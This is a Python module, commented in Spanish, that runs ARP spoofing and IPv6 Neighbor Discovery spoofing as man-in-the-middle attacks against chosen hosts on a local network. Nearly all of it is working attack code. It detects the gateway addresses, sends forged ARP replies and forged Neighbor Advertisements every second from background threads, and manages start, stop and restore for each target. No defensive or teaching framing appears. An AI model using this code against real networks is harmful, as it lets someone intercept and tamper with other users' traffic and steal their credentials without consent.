# controlador/arp_manager.py
from scapy.all import (
    ARP, Ether, srp, srp1, sendp, conf, getmacbyip, get_if_hwaddr,
    IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr,
    read_routes6, Packet # Import Packet para isinstance
)
import socket # Necesario para inet_pton
import time
import threading
import logging
import re
import traceback # Importamos traceback para el logging detallado de excepciones

# Configurar logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - [%(funcName)s] - %(message)s') # Nivel DEBUG para más detalle

active_attacks = {}  # Un diccionario para gestionar todos los hilos por IP de objetivo

# Variables globales de red (detectadas al inicio)
MY_MAC = None
GATEWAY_IPV4 = None
GATEWAY_IPV6_LL = None # Link-Local del Gateway IPv6
DEFAULT_IFACE = None

def mac_to_ipv6_linklocal(mac):
    """Convierte una MAC a una dirección IPv6 Link-Local (EUI-64)."""
    if not mac or len(mac.split(':')) != 6:
        logging.error(f"MAC inválida para convertir a IPv6 LL: {mac}")
        return None
    parts = mac.split(':')
    # Modificar para EUI-64: invertir el 7mo bit del primer byte (0x02)
    first_byte = int(parts[0], 16) ^ 0x02
    # Construir la parte EUI-64 insertando ff:fe
    eui_64_part = f"{first_byte:02x}{parts[1]}:{parts[2]}ff:fe{parts[3]}:{parts[4]}{parts[5]}"
    return f"fe80::{eui_64_part}"

def initialize_network_info():
    """Obtiene la información de red esencial (MAC, Gateways IPv4/IPv6)."""
    global MY_MAC, GATEWAY_IPV4, GATEWAY_IPV6_LL, DEFAULT_IFACE
    logging.info("Iniciando detección de información de red...")
    try:
        # Info IPv4
        route_info_ipv4 = conf.route.route("0.0.0.0") # Obtiene la ruta por defecto
        if route_info_ipv4 and len(route_info_ipv4) >= 3 and route_info_ipv4[0] and route_info_ipv4[2]:
            DEFAULT_IFACE = route_info_ipv4[0]
            GATEWAY_IPV4 = route_info_ipv4[2]
            MY_MAC = get_if_hwaddr(DEFAULT_IFACE)
            conf.iface = DEFAULT_IFACE # Establecer interfaz por defecto para Scapy
            logging.info(f"NET_INIT: Interfaz={DEFAULT_IFACE}, Mi MAC={MY_MAC}, Gateway IPv4={GATEWAY_IPV4}")
        else:
            logging.error("NET_INIT: No se pudo determinar Gateway IPv4 / Interfaz principal.")
            common_ifaces = [i for i in conf.ifaces.keys() if isinstance(i, str) and 'lo' not in i and 'docker' not in i and 'veth' not in i] # Asegurar que i sea string
            if common_ifaces:
                DEFAULT_IFACE = common_ifaces[0]
                MY_MAC = get_if_hwaddr(DEFAULT_IFACE)
                conf.iface = DEFAULT_IFACE
                logging.warning(f"NET_INIT: Usando interfaz fallback {DEFAULT_IFACE}, MAC {MY_MAC}. Gateway IPv4 no detectado.")
            else:
                logging.critical("NET_INIT: No se pudo encontrar ninguna interfaz de red adecuada.")
                return False

        # Info IPv6 (Gateway Link-Local)
        try:
            routes = read_routes6()
            found_gw_ipv6 = False
            if routes:
                for r in routes:
                    # ('::', 0, 'fe80::1234:5678:9abc:deff', 'wlan0', '2001:db8::1', 25931)
                    # Buscamos la ruta por defecto '::/0' que use nuestra interfaz
                    if r[0] == '::' and r[1] == 0 and r[3] == DEFAULT_IFACE:
                        gw_ipv6 = r[2]
                        if gw_ipv6 and gw_ipv6.startswith("fe80::"): # Queremos el link-local
                            GATEWAY_IPV6_LL = gw_ipv6
                            logging.info(f"NET_INIT: Gateway IPv6 Link-Local (vía tabla de rutas): {GATEWAY_IPV6_LL}")
                            found_gw_ipv6 = True
                            break
            if not found_gw_ipv6:
                # Fallback si no se encuentra en rutas, intenta derivar de la MAC del Gateway IPv4
                if GATEWAY_IPV4:
                    gw_mac_ipv4 = get_mac_for_ipv4(GATEWAY_IPV4)
                    if gw_mac_ipv4:
                        GATEWAY_IPV6_LL = mac_to_ipv6_linklocal(gw_mac_ipv4)
                        if GATEWAY_IPV6_LL:
                             logging.info(f"NET_INIT: Gateway IPv6 Link-Local (derivado de MAC Gateway IPv4): {GATEWAY_IPV6_LL}")
                        else:
                             logging.warning("NET_INIT: MAC del Gateway IPv4 no pudo convertirse a IPv6 LL.")
                    else:
                        logging.warning("NET_INIT: No se pudo obtener MAC del Gateway IPv4 para derivar IPv6 LL.")
                else:
                    logging.warning("NET_INIT: No se pudo autodetectar el Gateway IPv6 Link-Local. ND Spoofing podría estar limitado.")
        except Exception as e_ipv6:
            logging.warning(f"NET_INIT: Error obteniendo Gateway IPv6 Link-Local: {e_ipv6}. ND Spoofing podría estar limitado.")
        
        return True

    except Exception as e:
        logging.error(f"NET_INIT: Error fatal obteniendo info de red: {e}")
        logging.error(traceback.format_exc())
        return False

def get_mac_for_ipv4(ip_address):
    """Obtiene la MAC para una IPv4."""
    global DEFAULT_IFACE
    if not DEFAULT_IFACE:
        logging.error("GET_MAC_IPv4: Interfaz por defecto no establecida.")
        return None
    try:
        mac = getmacbyip(ip_address) # Esta función de scapy a veces es suficiente
        if mac and mac != "ff:ff:ff:ff:ff:ff":
            logging.debug(f"MAC para {ip_address} (getmacbyip): {mac}")
            return mac
        
        logging.debug(f"getmacbyip falló para {ip_address}, intentando con ARP request...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), 
                     timeout=2, verbose=0, retry=1, iface=DEFAULT_IFACE)
        if ans:
            logging.debug(f"MAC para {ip_address} (ARP): {ans[0][1].hwsrc}")
            return ans[0][1].hwsrc
    except Exception as e:
        logging.error(f"No se pudo obtener MAC para {ip_address}: {e}")
    return None

def get_mac_for_ipv6(ipv6_address_str):
    """Obtiene la MAC para una IPv6 usando Neighbor Solicitation."""
    global MY_MAC, DEFAULT_IFACE
    if not MY_MAC or not DEFAULT_IFACE or not ipv6_address_str:
        logging.error(f"Pre-condiciones no cumplidas. MY_MAC={MY_MAC}, DEFAULT_IFACE={DEFAULT_IFACE}, ipv6_address={ipv6_address_str}")
        return None
    try:
        my_ipv6_ll = mac_to_ipv6_linklocal(MY_MAC)
        if not my_ipv6_ll:
            logging.error(f"No se pudo generar IPv6 Link-Local para mi MAC {MY_MAC}")
            return None

        try:
            addr_bytes = socket.inet_pton(socket.AF_INET6, ipv6_address_str)
        except socket.error as e_sock:
            logging.error(f"Dirección IPv6 inválida para conversión: '{ipv6_address_str}': {e_sock}")
            return None
            
        last_3_bytes_hex = addr_bytes[-3:].hex()
        solicited_node_mcast_mac = f"33:33:ff:{last_3_bytes_hex[0:2]}:{last_3_bytes_hex[2:4]}:{last_3_bytes_hex[4:6]}"
        solicited_node_ipv6_target = f"ff02::1:ff{last_3_bytes_hex[0:2]}:{last_3_bytes_hex[2:]}"

        logging.info(f"Solicitando MAC para {ipv6_address_str} (MiLL: {my_ipv6_ll}, TargetSolNodeIP: {solicited_node_ipv6_target}, TargetSolNodeMAC: {solicited_node_mcast_mac})")

        ns_pkt = Ether(dst=solicited_node_mcast_mac, src=MY_MAC) / \
                 IPv6(src=my_ipv6_ll, dst=solicited_node_ipv6_target) / \
                 ICMPv6ND_NS(tgt=ipv6_address_str) / \
                 ICMPv6NDOptSrcLLAddr(lladdr=MY_MAC)
        
        logging.debug(f"Enviando NS packet: {ns_pkt.summary()}")
        ans_pkt = srp1(ns_pkt, timeout=3, verbose=0, iface=DEFAULT_IFACE, retry=2) 
        
        if ans_pkt:
            logging.debug(f"Paquete de respuesta recibido: {ans_pkt.summary()}")
            if ICMPv6ND_NA in ans_pkt:
                na_layer = ans_pkt[ICMPv6ND_NA]
                logging.debug(f"Es un NA. Target del NA: {na_layer.tgt}")
                
                if na_layer.tgt.lower() == ipv6_address_str.lower():
                    current_option = na_layer.payload
                    while isinstance(current_option, Packet) and current_option != b'':
                        if hasattr(current_option, 'lladdr'):
                            found_mac = current_option.lladdr
                            logging.info(f"MAC encontrada para {ipv6_address_str} -> {found_mac} (Tipo de opción: {type(current_option).__name__})")
                            return found_mac
                        if not hasattr(current_option, 'payload'):
                            break
                        current_option = current_option.payload
                    logging.warning(f"NA recibido para {ipv6_address_str} pero no se encontró la opción lladdr en su payload.")
                else:
                    logging.debug(f"NA recibido, pero para un target diferente: {na_layer.tgt} (esperado: {ipv6_address_str})")
            else:
                logging.debug(f"Paquete recibido no es NA: {ans_pkt.summary()}")
        else:
            logging.warning(f"No se recibió respuesta (timeout) para {ipv6_address_str} vía NS.")
            
    except Exception as e:
        logging.error(f"EXCEPCIÓN para {ipv6_address_str}. Tipo: {type(e)}, Mensaje: {str(e)}")
        logging.error(f"Traceback completo:\n{traceback.format_exc()}")
    return None

# --- Hilos de Spoofing ---
def arp_spoof_mitm_thread(target_ipv4, gateway_ipv4, my_mac, stop_event):
    target_mac = get_mac_for_ipv4(target_ipv4)
    gateway_mac = get_mac_for_ipv4(gateway_ipv4)
    if not target_mac or not gateway_mac:
        logging.error(f"ARP_MITM: No MACs para {target_ipv4} o gateway. Abortando hilo.")
        return
    logging.info(f"ARP_MITM: Iniciando para {target_ipv4} (MAC:{target_mac}) <-> {gateway_ipv4} (MAC:{gateway_mac})")
    pkt_to_target = Ether(dst=target_mac, src=my_mac)/ARP(op=2, pdst=target_ipv4, hwdst=target_mac, psrc=gateway_ipv4, hwsrc=my_mac)
    pkt_to_gateway = Ether(dst=gateway_mac, src=my_mac)/ARP(op=2, pdst=gateway_ipv4, hwdst=gateway_mac, psrc=target_ipv4, hwsrc=my_mac)
    while not stop_event.is_set():
        try:
            sendp(pkt_to_target, verbose=0, iface=DEFAULT_IFACE)
            sendp(pkt_to_gateway, verbose=0, iface=DEFAULT_IFACE)
            time.sleep(1) # <--- FRECUENCIA AUMENTADA
        except Exception as e: 
            logging.error(f"ARP_MITM: Error enviando para {target_ipv4}: {e}")
            logging.debug(traceback.format_exc())
    restore_arp(target_ipv4, gateway_ipv4, target_mac, gateway_mac)

def nd_spoof_mitm_thread(target_ipv6_ll, gateway_ipv6_ll, my_mac, stop_event):
    if not target_ipv6_ll or not gateway_ipv6_ll or not my_mac:
        logging.error(f"ND_MITM: Faltan parámetros: TGT_LL={target_ipv6_ll}, GW_LL={gateway_ipv6_ll}, MY_MAC={my_mac}")
        return

    target_mac = get_mac_for_ipv6(target_ipv6_ll) 
    gateway_mac = get_mac_for_ipv6(gateway_ipv6_ll) 
    
    if not target_mac or not gateway_mac:
        logging.error(f"ND_MITM: No se pudieron obtener MACs para target_ipv6={target_ipv6_ll} (MAC:{target_mac}) o gateway_ipv6={gateway_ipv6_ll} (MAC:{gateway_mac}). Abortando hilo.")
        return
        
    logging.info(f"ND_MITM: Iniciando para {target_ipv6_ll} (MAC:{target_mac}) <-> {gateway_ipv6_ll} (MAC:{gateway_mac})")
    pkt_to_target = Ether(dst=target_mac, src=my_mac) / \
                    IPv6(src=gateway_ipv6_ll, dst=target_ipv6_ll) / \
                    ICMPv6ND_NA(tgt=gateway_ipv6_ll, R=0, S=1, O=1) / \
                    ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
    pkt_to_gateway = Ether(dst=gateway_mac, src=my_mac) / \
                     IPv6(src=target_ipv6_ll, dst=gateway_ipv6_ll) / \
                     ICMPv6ND_NA(tgt=target_ipv6_ll, R=0, S=1, O=1) / \
                     ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
    while not stop_event.is_set():
        try:
            sendp(pkt_to_target, verbose=0, iface=DEFAULT_IFACE)
            sendp(pkt_to_gateway, verbose=0, iface=DEFAULT_IFACE)
            time.sleep(1) # <--- FRECUENCIA AUMENTADA
        except Exception as e: 
            logging.error(f"ND_MITM: Error enviando para {target_ipv6_ll}: {e}")
            logging.debug(traceback.format_exc())
    restore_nd(target_ipv6_ll, gateway_ipv6_ll, target_mac, gateway_mac)

# --- Funciones de Restauración ---
def restore_arp(target_ipv4, gateway_ipv4, target_mac, gateway_mac):
    logging.info(f"ARP_MITM: Restaurando para {target_ipv4}...")
    pkt1 = Ether(dst=target_mac, src=gateway_mac)/ARP(op=2, pdst=target_ipv4, hwdst=target_mac, psrc=gateway_ipv4, hwsrc=gateway_mac)
    pkt2 = Ether(dst=gateway_mac, src=target_mac)/ARP(op=2, pdst=gateway_ipv4, hwdst=gateway_mac, psrc=target_ipv4, hwsrc=target_mac)
    try:
        sendp([pkt1, pkt2], count=5, inter=0.3, verbose=0, iface=DEFAULT_IFACE)
        logging.info(f"ARP_MITM: Restauración enviada para {target_ipv4}.")
    except Exception as e: 
        logging.error(f"ARP_MITM: Error enviando restauración: {e}")
        logging.debug(traceback.format_exc())

def restore_nd(target_ipv6_ll, gateway_ipv6_ll, target_mac, gateway_mac):
    logging.info(f"ND_MITM: Restaurando para {target_ipv6_ll}...")
    pkt1 = Ether(dst=target_mac, src=gateway_mac) / \
           IPv6(src=gateway_ipv6_ll, dst=target_ipv6_ll) / \
           ICMPv6ND_NA(tgt=gateway_ipv6_ll, R=0, S=1, O=1) / \
           ICMPv6NDOptSrcLLAddr(lladdr=gateway_mac)
    pkt2 = Ether(dst=gateway_mac, src=target_mac) / \
           IPv6(src=target_ipv6_ll, dst=gateway_ipv6_ll) / \
           ICMPv6ND_NA(tgt=target_ipv6_ll, R=0, S=1, O=1) / \
           ICMPv6NDOptSrcLLAddr(lladdr=target_mac)
    try:
        sendp([pkt1, pkt2], count=5, inter=0.3, verbose=0, iface=DEFAULT_IFACE)
        logging.info(f"ND_MITM: Restauración enviada para {target_ipv6_ll}.")
    except Exception as e: 
        logging.error(f"ND_MITM: Error enviando restauración: {e}")
        logging.debug(traceback.format_exc())

# --- Funciones de Control Principales ---
def start_full_attack(target_ipv4):
    global GATEWAY_IPV4, GATEWAY_IPV6_LL, MY_MAC
    if not MY_MAC: 
        if not initialize_network_info(): 
            logging.error("Ataque no puede iniciar: Fallo crítico al inicializar información de red.")
            return False
    
    if target_ipv4 in active_attacks:
        logging.warning(f"Ataque ya activo para {target_ipv4}. Verificando estado de hilos...")
        current_attack = active_attacks[target_ipv4]
        all_threads_alive = True
        if not current_attack.get('threads'): 
             all_threads_alive = False
             logging.warning(f"No hay hilos registrados para {target_ipv4}, se intentará reiniciar.")
        else:
            for thread_name, thread_obj in current_attack['threads'].items():
                if not thread_obj.is_alive():
                    all_threads_alive = False
                    logging.warning(f"El hilo {thread_name} para {target_ipv4} no está vivo. Se intentará reiniciar.")
                    break
        if all_threads_alive and current_attack.get('threads'):
            logging.info(f"Todos los hilos para {target_ipv4} ya están activos.")
            return True 

    target_mac = get_mac_for_ipv4(target_ipv4)
    if not target_mac:
        logging.error(f"No se pudo obtener MAC IPv4 para {target_ipv4}. No se puede iniciar ataque completo.")
        return False

    if target_ipv4 in active_attacks: 
        logging.info(f"Limpiando ataque anterior para {target_ipv4} antes de reiniciar.")
        active_attacks[target_ipv4]['stop_event'].set()
        for thread_name, thread_obj in active_attacks[target_ipv4]['threads'].items():
            thread_obj.join(timeout=1)
        del active_attacks[target_ipv4]

    stop_event = threading.Event()
    threads = {}
    attack_info = {'stop_event': stop_event, 'threads': threads, 'target_mac': target_mac, 'target_ipv4': target_ipv4} 

    if GATEWAY_IPV4 and MY_MAC:
        logging.info(f"Preparando ataque ARP para {target_ipv4}")
        arp_thread = threading.Thread(target=arp_spoof_mitm_thread, args=(target_ipv4, GATEWAY_IPV4, MY_MAC, stop_event), name=f"ARP_{target_ipv4}")
        arp_thread.start()
        threads['arp'] = arp_thread
    else:
        logging.warning("No se iniciará ARP Spoofing: Falta Gateway IPv4 o Mi MAC.")

    if GATEWAY_IPV6_LL and MY_MAC:
        target_ipv6_ll = mac_to_ipv6_linklocal(target_mac)
        if target_ipv6_ll:
            logging.info(f"Preparando ataque ND para target MAC {target_mac} (IPv6 LL: {target_ipv6_ll})")
            nd_thread = threading.Thread(target=nd_spoof_mitm_thread, args=(target_ipv6_ll, GATEWAY_IPV6_LL, MY_MAC, stop_event), name=f"ND_{target_ipv4}")
            nd_thread.start()
            threads['nd'] = nd_thread
        else:
            logging.warning(f"No se pudo derivar IPv6 LL para MAC {target_mac}. ND Spoofing no se iniciará.")
    else:
        logging.warning("No se iniciará ND Spoofing: Falta Gateway IPv6 Link-Local o Mi MAC.")
    
    if not threads:
        logging.error(f"No se pudo preparar ningún hilo de ataque para {target_ipv4}")
        return False

    active_attacks[target_ipv4] = attack_info
    logging.info(f"Hilos de ataque para {target_ipv4} iniciados (o en proceso de inicio).")
    return True

def stop_full_attack(target_ipv4):
    if target_ipv4 in active_attacks:
        attack_info = active_attacks[target_ipv4]
        logging.info(f"Deteniendo todos los ataques para {target_ipv4}")
        attack_info['stop_event'].set()
        
        threads_to_join = list(attack_info['threads'].items())

        for thread_name, thread_obj in threads_to_join:
            logging.debug(f"Esperando al hilo {thread_name} para {target_ipv4}...")
            thread_obj.join(timeout=7) 
            if thread_obj.is_alive():
                logging.warning(f"El hilo {thread_name} para {target_ipv4} no terminó a tiempo.")
            else:
                logging.info(f"Hilo {thread_name} para {target_ipv4} detenido exitosamente.")
        
        del active_attacks[target_ipv4]
        logging.info(f"Todos los hilos para {target_ipv4} procesados y ataque eliminado del registro activo.")
        return True
    else:
        logging.warning(f"No se encontró ataque activo para {target_ipv4} al intentar detener.")
        return False

if not initialize_network_info():
    logging.critical("FALLO AL INICIALIZAR INFORMACIÓN DE RED. EL MÓDULO DE ATAQUE PODRÍA NO FUNCIONAR CORRECTAMENTE.")